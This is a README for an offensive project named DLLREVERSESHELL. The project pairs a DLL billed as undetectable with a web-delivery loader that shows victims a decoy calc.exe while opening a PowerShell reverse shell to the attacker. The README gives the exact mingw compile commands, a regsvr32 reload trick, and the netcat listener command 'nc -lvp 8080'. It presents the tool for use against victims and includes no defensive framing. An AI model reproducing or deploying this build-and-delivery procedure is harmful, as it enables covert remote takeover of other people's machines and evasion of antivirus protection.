# DLLREVERSESHELL
<b>A CUSTOM CODED FUD DLL, CODED IN C , WHEN LOADED , VIA A DECOY WEB-DELIVERY MODULE( FIRING A DECOY PROGRAM), WILL GIVE A REVERSE SHELL (POWERSHELL) FROM THE VICTIM MACHINE TO THE ATTACKER CONSOLE , OVER LAN AND WAN.
</b>

The project comprises of:


<p><b>. A custom C header file, mingwdll.h </b></p>
<p><b>. The DLL C code mingw_dll.c </b></p>
<p><b>. The Loader file loader.c , that will invoke a web delivery of the DLL ,to the target machine, load the DLL in the runtime, producing the decoy program for the victim on the foreground, and spawning a connect back reverse shell (powershell) to the attacker, in the back ground </b></p>

<p><b><i> Phase 1 : </b></i></p>

Place the mingwdll.h and mingw_dll.c in the same folder and compile using :

<b>i686-w64-mingw32-gcc -Wall -shared mingw_dll.c -o calc_helper.dll -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc </b>

This will create the FUD DLL <b> calc_helper.dll </b>

File Description:
<b> root@nautilus:~/Desktop/c_code/dll_rsh# file calc_helper.dll
calc_helper.dll: PE32 executable (DLL) (console) Intel 80386 (stripped to external PDB), for MS Windows
</b>

<p><b><i> Phase 2 : </b></i></p>
Compile the loader.c using <b> i686-w64-mingw32-gcc loader.c -o improved_calc.exe </b>
This will create the PE32 executable improved_calc.exe.

File Description:
<b>improved_calc.exe: PE32 executable (console) Intel 80386, for MS Windows </b>

When the file improved_calc.exe , it might initially throw a Dll load error, thus I have ensured that a second call to regsvr32 is made post a _sleep() function, to ensure the DLL load on runtime.

Post the DLL is loaded , it will fire the decoy , calc.exe and spawn a reverse shell, (netcat listener on port 8080 as defined in the header file { nc -lvp 8080 } ) 

Cheers

#Captain_Nemo

# DLLREVERSESHELL

<b><p>https://youtu.be/HR0C_2_UAT8</p></b>
